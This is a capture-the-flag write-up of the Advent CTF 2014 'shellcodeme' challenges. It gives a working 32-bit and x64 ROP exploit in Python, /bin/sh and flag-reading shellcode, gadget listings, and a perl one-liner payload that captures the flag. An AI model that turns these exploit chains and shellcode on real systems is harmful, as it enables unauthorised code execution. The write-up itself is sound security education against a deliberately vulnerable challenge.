### Solved by barrebas 

Why o why do we take part in these painful exercises? Again, `shellcodeme` seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!

We're given a binary and the C source code:

```c
/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#define SHELLCODE_LEN 1024

int main(void) {
    char *buf;
    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    read(0, &buf, SHELLCODE_LEN);
    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
}
```

The bug was kind of obvious: 

```c
read(0, &buf, SHELLCODE_LEN); // read to the location of buf itself
```

The code will read in the shellcode at `&buf`, not `buf`. This will allow us to overwrite that pointer and take control of execution at this line of code:

```c
(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
```

I chose to overwrite the `buf` pointer with `0x080484fc`, which is `leave; ret`. This will restore the stack and land us in my ROP chain. The basic idea is to re-use `mprotect` and `read` to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:

```python
#!/usr/bin/python
import struct
import socket
import telnetlib
import time
 
def p(x):
        return struct.pack('<L', x)
 
POP3RET = 0x804855d
MPROTECT = 0x8048330
READ = 0x8048340
 
payload = ""
payload += p(0x080484fc)        # leave; ret (restore stack)
payload += "A"*12               # dummy 
 
payload += p(MPROTECT)          # mprotect shellcode area back to rwx
payload += p(POP3RET)           # fix stack
payload += p(0x20000000)        # addr of shellcode
payload += p(0x1000)            # size (page-aligned)
payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
 
payload += p(READ)              # read in our shellcode
payload += p(POP3RET)           # fix stack
payload += p(0x0)               # stdin
payload += p(0x20000000)        # address
payload += p(1024)              # copied value
 
payload += p(0x20000000)        # return to shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.katsudon.org', 33201))
 
# send first stage
s.send(payload)
 
# for some reason, this delay was necessary
time.sleep(0.05)
 
# send shellcode, spawns /bin/sh
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
 
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

I thought I was home-free! Let's cat that flag and be done with it! But what's this? (Yes, I've started using kali! =))

```bash
root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
ls -alh
total 36K
dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
cat flag 2>&1
cat: flag: Permission denied
```

Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code... I transferred the binary over to my box and started poking it. 

The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:

```bash
   0x00000000004005f2 <+53>:    mov    edx,0x400
   0x00000000004005f7 <+58>:    mov    rsi,rax
   0x00000000004005fa <+61>:    mov    edi,0x0
   0x00000000004005ff <+66>:    mov    eax,0x0
   0x0000000000400604 <+71>:    call   0x400490 <read@plt>
   0x0000000000400609 <+76>:    mov    edx,0x1
   0x000000000040060e <+81>:    mov    esi,0x400
   0x0000000000400613 <+86>:    mov    edi,0x20000000
   0x0000000000400618 <+91>:    call   0x4004c0 <mprotect@plt>
```

I uploaded the binary to [ropshell.com](https://ropshell.com) and analyzed it to find the gadgets I'd need. I found `esi/rsi` and `edi/rdi` quickly, but `edx/rdx` was nowhere to be found. Finally, I located these two gadgets:

```
0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
```

Prepare for some mind-bending ROP chains...

```python
#!/usr/bin/python

import struct
def p(x):
    return struct.pack("L", x)

payload = ""

'''
   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
'''

# first, fix up stack   
payload += p(0x00400690)    # pop pop ret
payload += p(0x0)
payload += p(0x0)

#### MPROTECT
# gadgets to set edi, esi and edx and call mprotect
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x6)           # rbx   << needs to be ebp-1 for code path!
payload += p(0x7)           # rbp -> edx = mprotect.mask
payload += p(0x00601038-6*8)    # r12 -> mprotect@got.plt
payload += p(0x0)           # r13
payload += p(0x400)         # r14 -> rsi -> esi = mprotect.len
payload += p(0x20000000)    # r15 -> rdi -> edi = mprotect.addr

payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

#### READ
# gadgets to set edi, esi and edx and call read
'''
   0x00000000004005f2 <+53>:    mov    edx,0x400
   0x00000000004005f7 <+58>:    mov    rsi,rax
   0x00000000004005fa <+61>:    mov    edi,0x0
   0x00000000004005ff <+66>:    mov    eax,0x0
   0x0000000000400604 <+71>:    call   0x400490 <read@plt>
'''
# 0x601020 <read@got.plt>
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x400-1)       # rbx   << needs to be ebp-1 for code path!
payload += p(0x400)         # rbp -> edx = 0x400
payload += p(0x601020-0x3ff*8)  # r12 -> read@got.plt
payload += p(0x0)           # r13 
payload += p(0x20000000)    # r14 -> rsi -> esi = read.addr
payload += p(0x0)           # r15 -> rdi -> edi = 0?
                            # lucky for me, rax = 0
payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

# return to shellcode!
payload += p(0x20000000)

print payload
```

One of the tricky things with the mprotect and read ROP chains is the following. The code at `0x400671`, which I use to set `edx`, looks like this:

```
   0x400671 <__libc_csu_init+65>:   mov    edx,ebp
   0x400673 <__libc_csu_init+67>:   mov    rsi,r14
   0x400676 <__libc_csu_init+70>:   mov    edi,r15d
   0x400679 <__libc_csu_init+73>:   call   QWORD PTR [r12+rbx*8]
   0x40067d <__libc_csu_init+77>:   add    rbx,0x1
   0x400681 <__libc_csu_init+81>:   cmp    rbx,rbp  
   0x400684 <__libc_csu_init+84>:   jne    0x400670 <__libc_csu_init+64>
   0x400686 <__libc_csu_init+86>:   add    rsp,0x8
   0x40068a <__libc_csu_init+90>:   pop    rbx
   0x40068b <__libc_csu_init+91>:   pop    rbp
   0x40068c <__libc_csu_init+92>:   pop    r12
   0x40068e <__libc_csu_init+94>:   pop    r13
   0x400690 <__libc_csu_init+96>:   pop    r14
   0x400692 <__libc_csu_init+98>:   pop    r15
   0x400694 <__libc_csu_init+100>:  ret    
```

First `ebp` is copied to `edx`. Then `rsi` and `edi` are set. Then we call the QWORD pointer at a memory address referenced by `esi` and `ebx`. I chose to `esi` and `ebx` such that they point to the got pointer of mprotect. 

The problem arises after returning from the mprotect call:

```bash
   0x40067d <__libc_csu_init+77>:   add    rbx,0x1
   0x400681 <__libc_csu_init+81>:   cmp    rbx,rbp
   0x400684 <__libc_csu_init+84>:   jne    0x400670 <__libc_csu_init+64>
```

So I needed to make sure that `rbx` and `rbp` were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting `rbx` to `rbp-1`. Only thing left was to adjust `esi` and away we go! With the problem of setting `edx` out of the way, I could call mprotect to set `0x20000000` to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary. 

I sprinkled in some [shellcode magic](http://www.shell-storm.org/shellcode/files/shellcode-878.php) and was able to exploit the binary locally!

Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:


```python
shellcode = payload.encode('hex')

output = ""

for i in range(len(shellcode)/2):
    output += "\\x" +shellcode[i*2:i*2+2]

print output
```

I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn't work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read `flag` instead of `/etc/passwd`. For this, I had to adjust the offset:

```
xor byte [rdi + 11], 0x41
-->
xor byte [rdi + 4], 0x41
```

And **finally**, starting from the first binary:

```bash
root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
ADCTF_I_l0v3_tH15_4W350M3_m15T4K
```

This one was tough, but a fun one nonetheless! ROP all the things! =)

